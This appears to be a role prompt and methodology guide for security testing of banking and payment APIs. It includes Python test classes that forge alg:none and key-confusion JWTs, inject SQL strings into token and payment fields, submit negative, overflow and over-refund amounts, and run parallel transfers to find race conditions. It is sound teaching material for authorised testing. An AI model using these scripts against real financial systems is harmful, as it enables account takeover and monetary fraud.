# Specialized-Targets 11: Traditional Finance API Security

## Expert Role

You are an elite financial API security specialist with 15+ years of experience securing banking APIs, payment processing systems, and financial data exchange protocols. You possess deep expertise in PCI DSS compliance, SWIFT/CBPR+ messaging, ISO 20022 standards, Open Banking (PSD2), payment gateway integrations, and transaction integrity validation. You approach every assessment with the understanding that financial APIs handle real money, real identities, and are subject to strict regulatory oversight.

Your mindset:
- Every transaction is a potential fraud vector
- Every API key rotation is a potential service outage
- Every decimal place error in amount calculation is a potential financial loss
- Regulatory non-compliance is itself a vulnerability
- Rate limits are not suggestions — they are security controls

---

## Core Concepts

### Financial API Architecture Landscape

```
+-----------------------------------------------------------------------+
|                    FINANCIAL API ECOSYSTEM                            |
+-----------------------------------------------------------------------+
|                                                                       |
|  Consumer Layer                                                       |
|  +-----------+  +-----------+  +-----------+  +-----------+           |
|  | Mobile App|  | Web Portal|  | 3rd Party |  | Partner   |           |
|  | (REST)    |  | (GraphQL) |  | (Webhook) |  | (SOAP)    |           |
|  +-----+-----+  +-----+-----+  +-----+-----+  +-----+-----+         |
|        |              |              |              |                   |
|  +-----v--------------v--------------v--------------v-----+           |
|  |              API Gateway / WAF / Rate Limiter          |           |
|  |         (Kong / Apigee / AWS API Gateway)              |           |
|  +---------------------------+----------------------------+           |
|                              |                                        |
|  Service Layer              v                                        |
|  +---------------------------+----------------------------+           |
|  |  +----------+  +----------+  +----------+  +----------+|           |
|  |  | Auth     |  | Account  |  | Payment  |  |Compliance||           |
|  |  | Service  |  | Service  |  | Service  |  | Service  ||           |
|  |  | (OAuth2) |  | (REST)   |  | (ISO20022|| (PCI DSS) ||           |
|  |  +----+-----+  +----+-----+  +----+-----+  +----+-----+|          |
|  +------|------------|------------|------------|-----------+           |
|         |            |            |            |                       |
|  Data Layer          v            v            v                       |
|  +---------------------------+----------------------------+           |
|  |  +----------+  +----------+  +----------+  +----------+|           |
|  |  | Encrypted|  | Ledger   |  | Token    |  | Audit    ||           |
|  |  | Vault    |  | Database |  | Store    |  | Log DB   ||           |
|  |  | (HSM)    |  | (ACID)   |  | (PCI)    |  | (SIEM)   ||           |
|  |  +----------+  +----------+  +----------+  +----------+|           |
|  +---------------------------------------------------------+           |
|                                                                       |
|  External Settlement                                                  |
|  +-----------+  +-----------+  +-----------+                          |
|  | SWIFT     |  | ACH/Fed   |  | Card Net  |                          |
|  | Network   |  | Wire      |  | (Visa/MC) |                          |
|  +-----------+  +-----------+  +-----------+                          |
+-----------------------------------------------------------------------+
```

### Critical API Categories

| Category | Protocols | Risk Level | Key Standards |
|----------|-----------|------------|---------------|
| Payment Processing | REST, ISO 20022, JSON | CRITICAL | PCI DSS 4.0, PCI PIN |
| Account Management | REST, GraphQL | HIGH | PSD2 SCA, FFIEC |
| Transaction History | REST, SOAP | HIGH | GLBA, SOX |
| KYC/AML Compliance | REST, SOAP | CRITICAL | BSA/AML, FATF |
| Card Issuing | ISO 7816, EMV | CRITICAL | PCI PIN, PCI P2PE |
| Cross-Border (SWIFT) | MQ, REST (CBPR+) | CRITICAL | SWIFT CSP, ISO 20022 |
| Open Banking | REST, FHIR-like | HIGH | PSD2, Open Banking UK |
| Fraud Detection | REST, gRPC | HIGH | Internal models |

### PCI DSS 4.0 API Requirements (2024+)

```
PCI DSS 4.0 Relevant Requirements for APIs:
+------------------------------------------------------------------+
| Req 1: Install/maintain network security controls (API Gateway)  |
| Req 2: Secure configurations (no default creds in API configs)   |
| Req 3: Protect stored account data (tokenization at rest)        |
| Req 4: Encrypt transmission (TLS 1.2+ mandatory, mTLS preferred)|
| Req 6: Develop secure systems (OWASP ASVS for APIs)             |
| Req 7: Restrict access (RBAC on every API endpoint)              |
| Req 8: Identify users (MFA on admin API access)                  |
| Req 9: Physical access (HSM for key management)                  |
| Req 10: Log and monitor (all API access logged to SIEM)          |
| Req 11: Test security (DAST on API surface quarterly)            |
| Req 12: Support with policies (API security policy mandatory)    |
+------------------------------------------------------------------+
| NEW in 4.0: Customized Approach for API-specific controls        |
| NEW in 4.0: Targeted risk analysis for API endpoints             |
| NEW in 4.0: Anti-phishing controls (MFA for API consumers)       |
+------------------------------------------------------------------+
```

### SWIFT/CBPR+ Security Architecture

```
SWIFT Customer Security Programme (CSP):
+------------------------------------------------------------------+
| Mandatory Controls:                                               |
|   - Segment SWIFT infrastructure from general network             |
|   - Restrict and protect SWIFT operational data                   |
|   - Prevent compromise of SWIFT credentials                       |
|   - Detect anomalous activity on SWIFT messages                   |
|                                                                   |
| API-Specific Threats:                                             |
|   - MT-to-MX translation vulnerabilities (legacy MT -> ISO 20022)|
|   - Transaction signing bypass                                    |
|   - BIC/SWIFT code manipulation in payment messages               |
|   - Duplicate detection failures                                  |
|   - Sanctions screening bypass via API parameter manipulation     |
+------------------------------------------------------------------+
```

---

## Prerequisites

### Knowledge Requirements

1. **Financial Protocols**: ISO 20022 message structures (pain.001, camt.053, pacs.008), SWIFT MT/MX formats, NACHA file formats
2. **Regulatory Frameworks**: PCI DSS 4.0, PSD2/SCA, GLBA, SOX, BSA/AML, GDPR (for EU payment data)
3. **Authentication Standards**: OAuth 2.0 (RFC 6749), FAPI (Financial-grade API), mTLS, HMAC signatures, JWT with PS256/ES256
4. **Cryptographic Knowledge**: HSM integration, tokenization (PCI P2PE), key rotation, envelope encryption
5. **Transaction Processing**: ACID properties, eventual consistency, idempotency, reconciliation

### Lab Environment Setup

```bash
# Create finance API testing workspace
python -c "
import os, json

workspace = {
    'directories': [
        'finance-api-testing/recon',
        'finance-api-testing/auth',
        'finance-api-testing/payments',
        'finance-api-testing/transactions',
        'finance-api-testing/compliance',
        'finance-api-testing/reports'
    ],
    'config': {
        'test_environment': 'sandbox_only',
        'authorization_required': True,
        'data_sensitivity': 'PCI_DSS_SCOPE',
        'log_all_requests': True
    }
}

for d in workspace['directories']:
    os.makedirs(d, exist_ok=True)

with open('finance-api-testing/config.json', 'w') as f:
    json.dump(workspace['config'], f, indent=2)

print('Finance API testing workspace created')
print(f'Directories: {len(workspace[\"directories\"])}')
"
```

### Required Tools

```bash
# Core financial API testing tools
pip install requests pyjwt cryptography python-jose
pip install owasp-zap-api-gateway scapy
pip install iso20022 swifty  # ISO 20022 message parsing

# API testing framework
pip install httpx aiohttp pytest pytest-asyncio
pip install schemathesis  # Property-based API testing

# Cryptographic analysis
pip install pycryptodome python-rsa
pip install hsm-tools  # HSM interaction testing

# Compliance validation
pip install pci-dss-validator  # PCI DSS compliance checks
```

---

## Methodology

### Phase 1: API Discovery and Enumeration

```
Step 1: API Surface Mapping
+------------------------------------------------------------------+
|                                                                    |
|  1.1 OpenAPI/Swagger Discovery                                    |
|      GET /swagger.json                                            |
|      GET /openapi.yaml                                            |
|      GET /api-docs                                                |
|      GET /v1/api-docs                                             |
|      GET /v2/api-docs                                             |
|      GET /.well-known/openapi.yaml                                |
|                                                                    |
|  1.2 WADL/WSDL Discovery (Legacy SOAP APIs)                      |
|      GET /application.wadl                                         |
|      GET /service?wsdl                                             |
|      POST /soap endpoint with empty body                          |
|                                                                    |
|  1.3 JavaScript Bundle Analysis                                   |
|      - Extract API endpoints from SPA bundles                     |
|      - Look for hardcoded API keys in mobile app JS               |
|      - Analyze webpack chunks for hidden endpoints                |
|                                                                    |
|  1.4 Certificate Transparency Logs                                |
|      - Search CT logs for *.bankname.com subdomains               |
|      - Identify API-specific subdomains (api., payments.)        |
|                                                                    |
+------------------------------------------------------------------+
```

```python
# api_discovery.py - Financial API endpoint discovery
import requests
import json
import re
from urllib.parse import urljoin

class FinanceAPIDiscovery:
    """Discover financial API endpoints and documentation."""

    COMMON_DOC_PATHS = [
        '/swagger.json', '/swagger/v1/swagger.json',
        '/openapi.json', '/openapi/v1.json',
        '/api-docs', '/api/documentation',
        '/v1/api-docs', '/v2/api-docs',
        '/.well-known/openapi.yaml',
        '/redoc', '/docs', '/swagger-ui.html',
    ]

    FINANCE_SPECIFIC_PATHS = [
        '/api/v1/accounts', '/api/v1/payments',
        '/api/v1/transactions', '/api/v1/balances',
        '/api/v1/cards', '/api/v1/transfer',
        '/api/v1/wire', '/api/v1/ach',
        '/api/v1/kyc', '/api/v1/aml',
        '/api/v1/swift', '/api/v1/fx',
    ]

    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
        self.session.headers['User-Agent'] = 'FinanceAPITest/1.0'

    def discover_documentation(self):
        """Find API documentation endpoints."""
        found = []
        for path in self.COMMON_DOC_PATHS:
            try:
                resp = self.session.get(
                    f'{self.base_url}{path}',
                    timeout=10,
                    allow_redirects=True
                )
                if resp.status_code == 200:
                    content_type = resp.headers.get('Content-Type', '')
                    if any(t in content_type for t in ['json', 'yaml', 'html']):
                        found.append({
                            'path': path,
                            'status': resp.status_code,
                            'content_type': content_type,
                            'size': len(resp.content)
                        })
            except requests.RequestException:
                continue
        return found

    def enumerate_versioned_apis(self, max_version=5):
        """Enumerate API versions."""
        versions = []
        for v in range(1, max_version + 1):
            for prefix in ['/api', '/v']:
                path = f'{prefix}{v}'
                try:
                    resp = self.session.get(
                        f'{self.base_url}{path}',
                        timeout=10
                    )
                    if resp.status_code in [200, 401, 403]:
                        versions.append({
                            'path': path,
                            'status': resp.status_code,
                            'requires_auth': resp.status_code in [401, 403]
                        })
                except requests.RequestException:
                    continue
        return versions

    def check_swagger_ui(self):
        """Check for interactive Swagger UI (potential testing tool)."""
        swagger_paths = [
            '/swagger-ui/', '/swagger-ui.html',
            '/docs', '/redoc',
        ]
        results = []
        for path in swagger_paths:
            try:
                resp = self.session.get(
                    f'{self.base_url}{path}',
                    timeout=10
                )
                if resp.status_code == 200:
                    results.append({
                        'path': path,
                        'interactive': True,
                        'note': 'Interactive API docs available'
                    })
            except requests.RequestException:
                continue
        return results

    def analyze_js_bundles(self, js_urls):
        """Extract API endpoints from JavaScript bundles."""
        endpoints = set()
        patterns = [
            r'["\'](/api/[^"\']+)["\']',
            r'["\'](/v\d+/[^"\']+)["\']',
            r'baseURL:\s*["\']([^"\']+)["\']',
            r'apiUrl:\s*["\']([^"\']+)["\']',
        ]
        for url in js_urls:
            try:
                resp = self.session.get(url, timeout=15)
                if resp.status_code == 200:
                    for pattern in patterns:
                        matches = re.findall(pattern, resp.text)
                        endpoints.update(matches)
            except requests.RequestException:
                continue
        return list(endpoints)

    def run_full_discovery(self):
        """Execute complete API discovery."""
        print(f'[*] Targeting: {self.base_url}')
        print('[*] Starting API discovery...')

        docs = self.discover_documentation()
        print(f'[+] Found {len(docs)} documentation endpoints')

        versions = self.enumerate_versioned_apis()
        print(f'[+] Found {len(versions)} API versions')

        swagger = self.check_swagger_ui()
        print(f'[+] Found {len(swagger)} interactive docs')

        return {
            'documentation': docs,
            'versions': versions,
            'swagger_ui': swagger
        }
```

### Phase 2: Authentication Testing

```
Step 2: Financial API Authentication Analysis
+------------------------------------------------------------------+
|                                                                    |
|  2.1 OAuth 2.0 / FAPI Flow Analysis                              |
|      - Authorization code + PKCE (required by FAPI)              |
|      - Client credentials grant                                   |
|      - Token introspection endpoint                               |
|      - Token revocation endpoint                                  |
|                                                                    |
|  2.2 JWT Token Analysis                                           |
|      - Decode header (alg, kid, jku)                             |
|      - Verify signature algorithm (PS256/ES256 required by FAPI)  |
|      - Check claims (iss, aud, exp, scope, txn)                  |
|      - Test alg=none bypass                                      |
|      - Test key confusion (RS256 -> HS256)                       |
|                                                                    |
|  2.3 mTLS Client Certificate Testing                             |
|      - Certificate pinning validation                             |
|      - Self-signed certificate rejection                          |
|      - Certificate chain validation                               |
|      - CN/SAN matching to client_id                               |
|                                                                    |
|  2.4 API Key Security                                             |
|      - Key entropy analysis                                       |
|      - Key rotation mechanisms                                    |
|      - Scope limitations per key                                  |
|      - Key exposure in logs/responses                             |
|                                                                    |
+------------------------------------------------------------------+
```

```python
# auth_testing.py - Financial API authentication testing
import jwt
import json
import base64
import requests
from datetime import datetime, timedelta

class FinanceAuthTester:
    """Test financial API authentication mechanisms."""

    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def decode_jwt_claims(self, token):
        """Decode JWT without verification for analysis."""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return {'error': 'Invalid JWT format'}

            header = json.loads(base64.urlsafe_b64decode(
                parts[0] + '=='
            ))
            payload = json.loads(base64.urlsafe_b64decode(
                parts[1] + '=='
            ))
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'header_b64': parts[0],
                'payload_b64': parts[1]
            }
        except Exception as e:
            return {'error': str(e)}

    def test_jwt_alg_none(self, token, endpoint):
        """Test if server accepts alg:none JWT (should always fail)."""
        decoded = self.decode_jwt_claims(token)
        if 'error' in decoded:
            return {'vulnerable': False, 'reason': decoded['error']}

        # Create alg:none token
        header = decoded['header']
        header['alg'] = 'none'

        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b'=').decode()

        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(decoded['payload']).encode()
        ).rstrip(b'=').decode()

        forged_token = f'{header_b64}.{payload_b64}.'

        resp = self.session.get(
            f'{self.base_url}{endpoint}',
            headers={'Authorization': f'Bearer {forged_token}'},
            timeout=10
        )
        return {
            'vulnerable': resp.status_code == 200,
            'status_code': resp.status_code,
            'original_alg': decoded['header'].get('alg'),
            'forged_header': header
        }

    def test_jwt_key_confusion(self, token, public_key, endpoint):
        """Test HMAC key confusion (RS256 -> HS256)."""
        decoded = self.decode_jwt_claims(token)
        if 'error' in decoded:
            return {'vulnerable': False, 'reason': decoded['error']}

        # Try signing with public key as HMAC secret
        try:
            header = decoded['header']
            header['alg'] = 'HS256'
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).rstrip(b'=').decode()

            body = f'{header_b64}.{decoded["payload_b64"]}'

            # Sign with public key bytes as HMAC secret
            import hmac
            import hashlib
            signature = hmac.new(
                public_key.encode(),
                body.encode(),
                hashlib.sha256
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(
                signature
            ).rstrip(b'=').decode()

            forged = f'{body}.{sig_b64}'

            resp = self.session.get(
                f'{self.base_url}{endpoint}',
                headers={'Authorization': f'Bearer {forged}'},
                timeout=10
            )
            return {
                'vulnerable': resp.status_code == 200,
                'status_code': resp.status_code,
                'technique': 'HMAC key confusion'
            }
        except Exception as e:
            return {'vulnerable': False, 'error': str(e)}

    def test_token_scope_escalation(self, token, endpoint):
        """Test if token scope can be escalated."""
        decoded = self.decode_jwt_claims(token)
        if 'error' in decoded:
            return {'vulnerable': False}

        payload = decoded['payload']
        scopes = payload.get('scope', payload.get('scp', ''))

        if isinstance(scopes, str):
            scope_list = scopes.split()
        else:
            scope_list = scopes

        # Check for privileged scopes
        privileged = [
            'admin', 'write', 'transfer', 'wire',
            'swift', 'admin:accounts', 'admin:payments'
        ]
        current_priv = [s for s in scope_list if s in privileged]

        return {
            'current_scopes': scope_list,
            'privileged_scopes_found': current_priv,
            'scope_field': 'scope' if 'scope' in payload else 'scp',
            'note': 'Check if scope can be modified in token request'
        }

    def test_client_credentials_flow(self, token_endpoint,
                                      client_id, client_secret):
        """Test client credentials grant for weaknesses."""
        results = {}

        # Test 1: Empty credentials
        resp = self.session.post(
            f'{self.base_url}{token_endpoint}',
            data={
                'grant_type': 'client_credentials',
                'client_id': '',
                'client_secret': ''
            },
            timeout=10
        )
        results['empty_credentials'] = {
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        }

        # Test 2: SQL injection in client_id
        resp = self.session.post(
            f'{self.base_url}{token_endpoint}',
            data={
                'grant_type': 'client_credentials',
                'client_id': "test' OR '1'='1",
                'client_secret': 'test'
            },
            timeout=10
        )
        results['sqli_in_client_id'] = {
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        }

        # Test 3: Missing grant_type
        resp = self.session.post(
            f'{self.base_url}{token_endpoint}',
            data={
                'client_id': client_id,
                'client_secret': client_secret
            },
            timeout=10
        )
        results['missing_grant_type'] = {
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        }

        return results

    def analyze_token_endpoint_security(self, token_endpoint):
        """Analyze token endpoint security configuration."""
        results = {}

        # Check for rate limiting
        responses = []
        for i in range(5):
            resp = self.session.post(
                f'{self.base_url}{token_endpoint}',
                data={'grant_type': 'client_credentials'},
                timeout=10
            )
            responses.append(resp.status_code)

        results['rate_limiting'] = {
            'responses': responses,
            'rate_limited': 429 in responses,
            'note': 'Financial APIs MUST have rate limiting on token endpoint'
        }

        # Check CORS headers
        resp = self.session.options(
            f'{self.base_url}{token_endpoint}',
            headers={'Origin': 'https://evil.example.com'},
            timeout=10
        )
        cors = resp.headers.get('Access-Control-Allow-Origin', 'none')
        results['cors'] = {
            'allow_origin': cors,
            'secure': cors == 'none' or cors == '',
            'note': 'Token endpoint MUST NOT allow arbitrary origins'
        }

        return results
```

### Phase 3: Transaction Integrity Testing

```
Step 3: Payment and Transaction Security
+------------------------------------------------------------------+
|                                                                    |
|  3.1 Idempotency Testing                                          |
|      - Replay same payment request with same idempotency key     |
|      - Verify only one transaction processed                      |
|      - Test idempotency key predictability                        |
|                                                                    |
|  3.2 Amount Manipulation                                           |
|      - Modify transaction amount in transit                       |
|      - Test negative amounts (credit vs debit confusion)          |
|      - Test zero-amount transactions                               |
|      - Test overflow/underflow on decimal fields                   |
|      - Currency code validation (ISO 4217)                        |
|                                                                    |
|  3.3 Race Conditions in Transfers                                  |
|      - Parallel transfer requests from same account               |
|      - Balance check followed by transfer (TOCTOU)               |
|      - Concurrent modification of beneficiary details             |
|                                                                    |
|  3.4 Transaction Reversal/Refund                                   |
|      - Double refund on same transaction                           |
|      - Refund to different account than original                  |
|      - Partial refund amount exceeding original                    |
|      - Refund timing manipulation                                  |
|                                                                    |
|  3.5 SWIFT/CBPR+ Message Integrity                                 |
|      - MT-to-MX translation validation                            |
|      - Transaction reference manipulation                          |
|      - Sanctions screening bypass via field ordering               |
|      - BIC validation in beneficiary fields                        |
|                                                                    |
+------------------------------------------------------------------+
```

```python
# transaction_testing.py - Financial transaction integrity testing
import requests
import json
import uuid
import time
from concurrent.futures import ThreadPoolExecutor

class TransactionIntegrityTester:
    """Test financial transaction integrity and controls."""

    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {auth_token}',
            'Content-Type': 'application/json'
        })

    def test_idempotency(self, payment_endpoint, payment_data,
                          idempotency_key=None):
        """Test payment idempotency (duplicate protection)."""
        if not idempotency_key:
            idempotency_key = str(uuid.uuid4())

        results = []
        for i in range(3):
            resp = self.session.post(
                f'{self.base_url}{payment_endpoint}',
                json=payment_data,
                headers={'Idempotency-Key': idempotency_key},
                timeout=15
            )
            results.append({
                'attempt': i + 1,
                'status_code': resp.status_code,
                'response': resp.json() if resp.headers.get(
                    'Content-Type', ''
                ).startswith('application/json') else resp.text[:200]
            })

        # Analyze results
        unique_statuses = set(r['status_code'] for r in results)
        return {
            'idempotency_key': idempotency_key,
            'attempts': results,
            'all_same_status': len(unique_statuses) == 1,
            'idempotent': len(unique_statuses) == 1 or (
                200 in unique_statuses and 409 in unique_statuses
            ),
            'duplicate_processed': results[0]['status_code'] == 200 and
                                   results[1]['status_code'] == 200
        }

    def test_amount_manipulation(self, payment_endpoint, base_amount='100.00',
                                  currency='USD'):
        """Test various amount manipulation scenarios."""
        tests = []

        # Test negative amount
        test_data = {
            'amount': '-100.00',
            'currency': currency,
            'destination': 'test_account_001'
        }
        resp = self.session.post(
            f'{self.base_url}{payment_endpoint}',
            json=test_data, timeout=15
        )
        tests.append({
            'test': 'negative_amount',
            'amount': '-100.00',
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        # Test zero amount
        test_data['amount'] = '0.00'
        resp = self.session.post(
            f'{self.base_url}{payment_endpoint}',
            json=test_data, timeout=15
        )
        tests.append({
            'test': 'zero_amount',
            'amount': '0.00',
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        # Test overflow amount
        test_data['amount'] = '9999999999999999.99'
        resp = self.session.post(
            f'{self.base_url}{payment_endpoint}',
            json=test_data, timeout=15
        )
        tests.append({
            'test': 'overflow_amount',
            'amount': '9999999999999999.99',
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        # Test SQL injection in amount
        test_data['amount'] = "100.00' OR '1'='1"
        resp = self.session.post(
            f'{self.base_url}{payment_endpoint}',
            json=test_data, timeout=15
        )
        tests.append({
            'test': 'sqli_in_amount',
            'amount': "100.00' OR '1'='1",
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        # Test float precision manipulation
        test_data['amount'] = '100.005'
        resp = self.session.post(
            f'{self.base_url}{payment_endpoint}',
            json=test_data, timeout=15
        )
        tests.append({
            'test': 'precision_manipulation',
            'amount': '100.005',
            'status': resp.status_code,
            'accepted': resp.status_code == 200,
            'note': 'Rounding behavior - does server round up or down?'
        })

        return {
            'tests': tests,
            'amount_manipulation_possible': any(
                t['accepted'] for t in tests
            )
        }

    def test_concurrent_transfers(self, transfer_endpoint,
                                    account_id, amount, num_parallel=5):
        """Test race condition in parallel transfers."""
        results = []

        def make_transfer(i):
            data = {
                'source_account': account_id,
                'amount': amount,
                'destination': f'test_dest_{i}',
                'reference': f'race_test_{uuid.uuid4().hex[:8]}'
            }
            try:
                resp = self.session.post(
                    f'{self.base_url}{transfer_endpoint}',
                    json=data, timeout=15
                )
                return {
                    'thread': i,
                    'status': resp.status_code,
                    'response': resp.json() if resp.headers.get(
                        'Content-Type', ''
                    ).startswith('application/json') else resp.text[:100]
                }
            except Exception as e:
                return {'thread': i, 'error': str(e)}

        with ThreadPoolExecutor(max_workers=num_parallel) as executor:
            futures = [
                executor.submit(make_transfer, i)
                for i in range(num_parallel)
            ]
            results = [f.result() for f in futures]

        successful = [r for r in results if r.get('status') == 200]
        return {
            'parallel_requests': num_parallel,
            'successful': len(successful),
            'results': results,
            'race_condition_likely': len(successful) > 1
        }

    def test_refund_manipulation(self, refund_endpoint, transaction_id,
                                   original_amount):
        """Test refund amount manipulation."""
        tests = []

        # Test refund greater than original
        over_refund = str(float(original_amount) * 2)
        resp = self.session.post(
            f'{self.base_url}{refund_endpoint}',
            json={
                'transaction_id': transaction_id,
                'amount': over_refund
            }, timeout=15
        )
        tests.append({
            'test': 'over_refund',
            'refund_amount': over_refund,
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        # Test negative refund (should be rejected)
        resp = self.session.post(
            f'{self.base_url}{refund_endpoint}',
            json={
                'transaction_id': transaction_id,
                'amount': '-50.00'
            }, timeout=15
        )
        tests.append({
            'test': 'negative_refund',
            'status': resp.status_code,
            'accepted': resp.status_code == 200
        })

        return {
            'tests': tests,
            'refund_manipulation_possible': any(
                t['accepted'] for t in tests
            )
        }
```

### Phase 4: Compliance Validation

```
Step 4: PCI DSS and Regulatory Compliance
+------------------------------------------------------------------+
|                                                                    |
|  4.1 Data Exposure Checks                                         |
|      - PAN in API responses (should be masked: XXXX-XXXX-XXXX-1234)|
|      - CVV in any stored form (prohibited)                        |
|      - Track data in API logs                                     |
|      - Sensitive auth data post-authorization                     |
|                                                                    |
|  4.2 Encryption Validation                                         |
|      - TLS 1.2+ enforced (no downgrade)                           |
|      - Certificate validity and chain                             |
|      - Strong cipher suites only                                  |
|      - HSTS header present and valid                              |
|                                                                    |
|  4.3 Access Control                                                |
|      - RBAC on each endpoint                                       |
|      - Merchant-level vs processor-level access                   |
|      - Admin functions require MFA                                |
|      - Session timeout enforcement                                |
|                                                                    |
|  4.4 Logging and Monitoring                                        |
|      - Access logs for all cardholder data access                 |
|      - Log integrity protection                                   |
|      - Real-time alerting on anomalies                            |
|      - Log retention compliance (1 year min)                      |
|                                                                    |
+------------------------------------------------------------------+
```

```python
# compliance_testing.py - PCI DSS API compliance checks
import requests
import re
import json

class PCIComplianceTester:
    """Validate PCI DSS compliance for financial APIs."""

    PAN_PATTERN = re.compile(
        r'\b(?:\d[ -]*?){13,19}\b'
    )
    SENSITIVE_HEADERS = [
        'X-Api-Key', 'X-Client-Secret', 'X-Signing-Key'
    ]

    def __init__(self, base_url, auth_token):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers['Authorization'] = f'Bearer {auth_token}'

    def check_pan_exposure(self, endpoints):
        """Check if PAN is exposed in API responses."""
        findings = []
        for endpoint in endpoints:
            try:
                resp = self.session.get(
                    f'{self.base_url}{endpoint}', timeout=15
                )
                if resp.status_code == 200:
                    pan_matches = self.PAN_PATTERN.findall(resp.text)
                    for match in pan_matches:
                        # Check if PAN is fully visible (not masked)
                        clean = re.sub(r'[\s-]', '', match)
                        if len(clean) >= 13 and not clean.startswith('X'):
                            findings.append({
                                'endpoint': endpoint,
                                'exposed_pan': match[:6] + '****' +
                                               match[-4:],
                                'severity': 'CRITICAL',
                                'pci_requirement': 'Req 3.3'
                            })
            except requests.RequestException:
                continue
        return findings

    def check_tls_configuration(self):
        """Validate TLS configuration."""
        import ssl
        import socket

        hostname = self.base_url.replace('https://', '').split('/')[0]
        results = {'checks': []}

        try:
            context = ssl.create_default_context()
            with socket.create_connection(
                (hostname, 443), timeout=10
            ) as sock:
                with context.wrap_socket(
                    sock, server_hostname=hostname
                ) as ssock:
                    cert = ssock.getpeercert()
                    protocol = ssock.version()
                    cipher = ssock.cipher()

                    results['checks'].append({
                        'test': 'tls_version',
                        'value': protocol,
                        'compliant': 'TLSv1.2' in protocol or
                                     'TLSv1.3' in protocol
                    })
                    results['checks'].append({
                        'test': 'cipher_suite',
                        'value': cipher[0] if cipher else 'unknown',
                        'compliant': 'RC4' not in (cipher[0] if cipher else '') and
                                     'DES' not in (cipher[0] if cipher else '') and
                                     'NULL' not in (cipher[0] if cipher else '')
                    })
                    results['checks'].append({
                        'test': 'certificate_valid',
                        'not_after': cert.get('notAfter', ''),
                        'not_before': cert.get('notBefore', '')
                    })
        except Exception as e:
            results['error'] = str(e)

        return results

    def check_security_headers(self, endpoint='/'):
        """Check for required security headers."""
        try:
            resp = self.session.get(
                f'{self.base_url}{endpoint}', timeout=10
            )
            headers = resp.headers

            checks = [
                {
                    'header': 'Strict-Transport-Security',
                    'present': 'Strict-Transport-Security' in headers,
                    'value': headers.get('Strict-Transport-Security'),
                    'required': True,
                    'pci': 'Req 4.2.1'
                },
                {
                    'header': 'X-Content-Type-Options',
                    'present': 'X-Content-Type-Options' in headers,
                    'value': headers.get('X-Content-Type-Options'),
                    'expected': 'nosniff'
                },
                {
                    'header': 'X-Frame-Options',
                    'present': 'X-Frame-Options' in headers,
                    'value': headers.get('X-Frame-Options')
                },
                {
                    'header': 'Content-Security-Policy',
                    'present': 'Content-Security-Policy' in headers,
                    'value': headers.get('Content-Security-Policy')
                },
                {
                    'header': 'X-Request-ID',
                    'present': 'X-Request-ID' in headers,
                    'note': 'Required for audit trail correlation'
                }
            ]
            return {'endpoint': endpoint, 'checks': checks}
        except requests.RequestException as e:
            return {'error': str(e)}

    def check_error_information_leakage(self, endpoint, payload=None):
        """Check if error messages leak sensitive information."""
        test_payloads = [
            {},  # Empty body
            {'invalid': True},  # Wrong format
            {'amount': "test' OR '1'='1"},  # SQL injection
            {'amount': '{{7*7}}'},  # Template injection
        ]

        findings = []
        for test in test_payloads:
            try:
                resp = self.session.post(
                    f'{self.base_url}{endpoint}',
                    json=test, timeout=10
                )
                if resp.status_code >= 400:
                    body = resp.text.lower()
                    sensitive_patterns = [
                        'stack trace', 'traceback', 'exception',
                        'sql', 'database', 'mysql', 'postgres',
                        'oracle', 'internal server', 'debug',
                        'password', 'secret', 'token'
                    ]
                    for pattern in sensitive_patterns:
                        if pattern in body:
                            findings.append({
                                'endpoint': endpoint,
                                'pattern_found': pattern,
                                'status_code': resp.status_code,
                                'severity': 'MEDIUM'
                            })
                            break
            except requests.RequestException:
                continue

        return findings

    def run_compliance_scan(self, api_endpoints):
        """Run complete PCI DSS compliance scan."""
        results = {
            'pan_exposure': self.check_pan_exposure(api_endpoints),
            'tls': self.check_tls_configuration(),
            'headers': self.check_security_headers(),
            'error_leakage': []
        }

        for endpoint in api_endpoints[:5]:  # Test first 5 endpoints
            leakage = self.check_error_information_leakage(endpoint)
            results['error_leakage'].extend(leakage)

        return results
```

---

## Tool Arsenal

### Primary Tools

```bash
# API Security Testing
# Burp Suite Professional - Primary financial API testing proxy
# Use Repeater for manual testing, Intruder for fuzzing

# OWASP ZAP - Open source alternative
python -m zapv2api  # ZAP API automation

# Specialized Financial API Tools

# Schemathesis - Property-based API testing from OpenAPI spec
schemathesis run https://api.bank.com/openapi.json \
  --checks all \
  --hypothesis-max-examples=100 \
  --base-url https://api.bank.com

# jwt_tool - JWT analysis and testing
python jwt_tool.py <TOKEN> -X k  # Key confusion test
python jwt_tool.py <TOKEN> -X n  # None algorithm test
python jwt_tool.py <TOKEN> -d   # Decode and analyze

# SWIFT message validation
python -c "
from iso20022 import camt
# Parse and validate SWIFT MX messages
msg = camt.Camt053.parse('test_message.xml')
print('Message type:', msg.message_type)
"
```

### Custom Python Scripts

```bash
# Rate limit testing
python -c "
import requests, time

url = 'https://api.bank.com/v1/payments'
headers = {'Authorization': 'Bearer test_token'}

start = time.time()
for i in range(100):
    resp = requests.post(url, json={'amount': '1.00'}, headers=headers)
    if resp.status_code == 429:
        print(f'Rate limited after {i+1} requests')
        print(f'Rate limit: {resp.headers.get(\"Retry-After\", \"N/A\")}')
        break
elapsed = time.time() - start
print(f'Total time: {elapsed:.2f}s')
"

# API key entropy analysis
python -c "
import math
from collections import Counter

def calculate_entropy(key):
    counter = Counter(key)
    length = len(key)
    entropy = -sum(
